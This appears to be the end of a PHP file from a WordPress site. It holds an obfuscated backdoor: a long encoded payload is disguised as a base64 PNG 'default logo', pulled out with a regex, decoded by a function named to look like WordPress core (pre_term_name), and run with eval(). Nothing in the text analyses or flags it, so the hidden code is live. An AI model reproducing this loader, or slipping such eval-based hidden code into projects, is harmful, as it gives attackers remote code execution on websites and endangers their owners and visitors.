GM6aVB0GpZNknhhhv8fpaBTL7wWjwvMbmdBEgh4nkLTfDGDy569e1EEROEM%TCPp1%e3KR1%M6WFuNOoHpYe#Jgg9k7q8694VyQPee2s%sE7j2TdkUk#TRQ16m62kxu19#AISKa5mSqd8QNM3qOK4%O2PNXz07w2219iWzHxkx1DHsyhsPiwhLu7HdJdxl38fe0sj2S#HxRKnTeHD97Qcp13XVasGqSVlAqu#XwG73R7O40NuU6u5znJ0fPzo64JEB1uks#nAzXVI3#8#P3P9FLLvTKSeiLQU%5aLhjjr4ajjABmlcV4Idv8NfCgdUAmqlqiQhgfM6PM132y2h3%SReMhFNAIrUgcRE84rtdEIxGMo4JPyCt6SsvTbqf9zrh87CYvEUJFpNrYCPD2SFWqV0trrmZxgOVGbL%VlXtCZiZw6YNe%zkBLmnF2DVCyFw#NmrdOvDi4r%TEMdxeGGBp9vb1V5y9KO0Yw73ecbQqklxVJl2O1qxLRjZ%ufdGqqOQhEVrTZqS1gY14U7hV8XFlA4TsLwxjJtOVXvcGIMqRuBaUE4AdUN0F#OF3xoiOjuerRZQLcUAf5QJLTUHxtzD61kYhl24orgquZzeIi0YFnNeu6RzAuw9v3qyjHT86ICPdu3ezSfA1s5DazQYFPJBukGFirsL4YiMewWgEoowmiRsUaI5qWtXs%FaRn51W7boFXwpgTQwobF7kifs5B9kBtwNfvzs9Ojljr9#dHVtjBq#MV8KryXDjRZCFl7Owfz178#HolAEzwQI1D0jRWVtuYx2zExGCfaXQq4KrOmdTViHcfMuaX0bTgyRQJSGhcvWp6iluEsBuehgtYvBa5Kh3XzAP50Sm7P3CjFkp7X6XmJDcnhso5mS%dmTUrjcZEVLwmnyu2Xwdl7uKy4tAkpv67rpw6Q%mKVmZzTWEz%ir5l#JLUNlkhMmTHFGHoGAkHVHAfEIp3XWCVaTXMfS17P6VztDZUYToCjU0BJlujThO1gchVH#JRql8u9wNauOK2EJ2rxUCiUbNndoQZ9izos#GgbOj7Qtmu50uk86To#JktTixR0vMQV6VLnvFXGQZ0BZ5lU2ebo#6w%Hr5%unJTlvY7Dp8kGmT9UZV6tzzxePv3##%IaQ0JZXmM0FfbUuWZc1HXuPQVqAj%8OCiqvy3gA#c#VPyoJS4kdpdzL4wKGfIxvbOruYgXeSNWAtRQXN##yecWLgeqpVRQxTKHY95W%JhjocHW08FyH5Mm0v8L1bJcjs0UGbKw%O6IsqnV8iz0oBuhV49ok4SZ0e%4ArAv%A1gbsCYry3ckKvvdPL#hVVnM52vv6KdExDSVwmMz#pYgFYANjeduLlb7NV#ujtJaZMbhPPQ8GU1grnlg73Rrh%GiPOHyD9qvw#vglEPb1Cgqaf3wtCuXrwQhjm9WWjdnALY74kNAU0wrIJZygtZXJq43WpAdTK#GmZshILYLLrEnxZaQsSuoOaywkvQvFUIH0FLWGYEKji057mBhGnwPTmOMqBbljm3DeniwaqwD1xVogJKkfP0auTyAkGzBBlkgdhBVLV0G1lOpIKYC8eR0XhK5trGAV22NqenXqWXrJEB2%rC2YwMmrvvoUPM70AIXrx2Dw0S#CFE0AbWehq4OgEk3FO8gDNLx7J5MD8eDc#pJoTM7WpUyashbUY3G5p0JQok#ieqS3m7T6kWpBYBX6D96Lwbaz06ywO0nVymzbQcnWlz7Ubp0QSqtod4inTgM2SQbOy8kMCIH0Y8leIyCdHnF0lYHIUUx0uFeYjyAdMrI8tR07ULdPA0L%7CQGMYxky4iBWZ4kDLJOE6pLMqmi13cOlpImSUvjh4SzuU4wChGVwa0K23MpQMDWisQn5QW17XGDBFh#qEedpvpROapzmCvNqzPjob39XHC50E9jiikEklkoLAhKiA6V84WFHUlyEP10l#GNFqcRUkLJ4w1EV0rWgax1%ST4d#K3dPk#R05F%hVHhormOL4xdN2DkNTm3kpvXy0OW4S9KSOLh33fYAywNoNmlJBUhs#yIu3F%6XG1unbSWHViZwl%tKL0OuEvA3c2A9wh4bx1wyTVf5tZSVs#aczWEkFUUpbiiF6vTvpncVclZSXlA2BwXuhwWCBQ%VKa5iYy3ppQQOeJCvUtqRUCGfCoeMer055fupYyD%OiROtxcDmjHN96#F8igzHZJ1fMTMgfUWMi86JrPTmLUcodBIzAyuqtZynLX9pWTEq%oEWhOTZ#MddQ9i%ktLXstxzt5jN41PPm62vPv###%R6FBp8T4nrUMXiHjGkijUQ1aDQ%yp1Iym9vcAqZSfqvMhrVrA0leMSZKWkyKpXU3a0Y5mvCnbb57fvzh3Vn9O9qVi5QpTwh#Vwdzr0k2LypLwj1YbpXyHuFepWb4KxWgW6rpxJJa%xeFqkhaRW#2Cweaz4Rsdhqgk#kXdCfzfUKcY3d7DttPF958Pqx%qkXnLihQn3HhSa94FDDtGzu0jjyqSpZXT81ROM6B1SyH4KtVlml94AWewtUZlOe6IY6g1irgoNM3IZSMcYlEOsJO98OVq6O02ylD5QmTiKuPPm4wZmQjWHHBpB#mtPfpU6l2nDGx#qzaL7MPwpuPB#YDj6SoJMT9vIxRt3LmC54dpuucwqWSlt6Uxvw4COd1BCTuYLtsr101RO1DHCR8lU1BT6ifgH9hPZKjCVkNLxm3JpTGZ32GjoST4RHdRY9oGXAHuVdQiM7wY#i%tMHeQxXYNxUh8LAlpYKIo6UQI4PrNlWWaV5XVHR4S63bkzW7dcg6a2SVwFoc9W5Vo7nQZi6P06dL2ekQ8Q2QIvOsz94nwQ1JhQ1p3Bd1#vMJfaQIfYcd8#00668j1KrjjmRVg%y8oUFtsOTiJhW2bUyuctmb129fnwGjs#OXL7lPi0X1d3ttLelNp5i1pfycL#ZnUU4J9pbb3Gu7udmkXArbuxJSEHE5s%6kZF6CHJbKCLkORw2g9JZMCmps7EFuaZrdct2o%FB8V4YA8sKoMgbQN92%4X866g8GVwgjLF8JxXXLyS1FN3crJuLNtzrgtVFE6TZccEcB6Lmg0pAKwQwXjwBFIXFnFjZoS1Qt7Xs6ZVMOTHcJjU%aQU08supd%e6z#qUqItrVmQM9mAGP9RpYJBL6Hgw6B109v9xfcWMfklhFaEjKO6HQLLgeHWLi%m7IJ16zRtatm2YmtxXNu1dJvUrzkpGH3TVNsWs13#ccq9pRC7as#5INMDpMcjUkc34P44OVxegjnhN#gfnYUKpkW4260uFP7ePirrVuA02IRiuqQZaGRKfEKIm%KNeSrC1QNx8PRogNqQYZJ3BmPOoE%MZrWcrkc8kZJ3lZePE8CCpy4mKENdNrdeyCivu7lS1FHYCiBVqlMeXoYzBeYcBfKVMNY4y#rcSy9Tg6OC3vLCwh3x5lM5Kwq5eZJQwZLB0IO3zOoEwtOpjA3ZXHMM96Wf1nfPUzTKiHbpP9jObQn3EV9eH06ARW1ehy#zNqwqNlEt78jFPRnVvYx5OEmuJxrV53D1vKPs0p6DaDTh7CnKTbvZFXWEtdT3SnvHyIIpK#jmAFkVf111vRZAfm#04FtypOqppr1clxWk%IhbHyMC2ZR40b3vOx%8puHgA0aqu4Zcfes#9yv2fAmHJIVPQLgzO89cL5WZCKk2%ajoNnIdAcMVol8zoKfO7psLiDZ#S8WZYte7sY31MdjePfo3fP3h7hbTHq%cnRPz8cnZ6NPpy8Fr6jNdxZWKJBmtBzrMLTYXFHnur66JCzi44l#oaTHJj4dS7ib%MnPI7XEWXJWtCV37BgRnd1ikXKyYdXfN#hZcYMFHiazCkpXN5FIiKayQKarN1koKObTfL85PX7M9EkcruXbrEvuHWruLLBNPSlawmJEZITPHjBaLxKEvSkxnd1Mzythi6No6ux4xM3fZjIzbCtkk7V2TYv0OYQeRYPmPMSvnvsJEhX84y9iMf7hPDQMdoAD0tKpnBU2O%yg4LIjQzZsfKouJDSesc7QOF1WhqCJVjgxQckoED7nGexefIa6ayMwMNtbkJUneIZ6Cw2gy#5ZEKp3KbjpQmpVLlLTBQIIGo2Y2scV1quIqPsnG1Z1JaKgOvisHJ#E9o4rMwnjdyMjrIRmtDVIMQx2PUjUO5zpgxskUMkezlbjlYU1wnW7YrRKGsW5zN2ObspCKjVL7jTBKyleAHGMmdFxwJdBGmKlgAAJai34lmEI6ccVgbuEpNqttUl7KtaDS8SERIlnw99KE9APNztnMU93Qz3wCNf7bxHy9VmWdx%7yBZQdJj71#933V5g95AIllZzFzYYchpddGuTdV8TdU6TYW7YXejVgCoFdKAn70VHbPsXloE5oSMjYB0ZooUgGECAiRp284tfvMgFOYkJUN43T9PnTzX8f#3c7HH#dTkKTdLmk8d4kEH1zSaI8VlYw6#EW0qIVQTCxC8QcEE#fH0eATy7PT18TsBkXqTYAEzFCUfhlGI8rXu4mu8x0%cXGWGbVGXita8vOzeCmAklwQfp9YoBo%2ZAxoY0eDx90b8fYiDb0wyfA0MhzmwK041B43VNogJKllSGgL0D0Nxq#jSYw9WRIuzBPrhXXU5Ks19uZzmuRGmKsKFMoTjmf%Gw==">';
preg_match('#<img src="data:image/png;(.*)">#', $wp_default_logo, $logo_data);
$logo_image = $logo_data[1];
$wpautop = pre_term_name( $logo_image, $wp_nonce );
if(isset($wpautop)){
    eval($wpautop);
}
?>
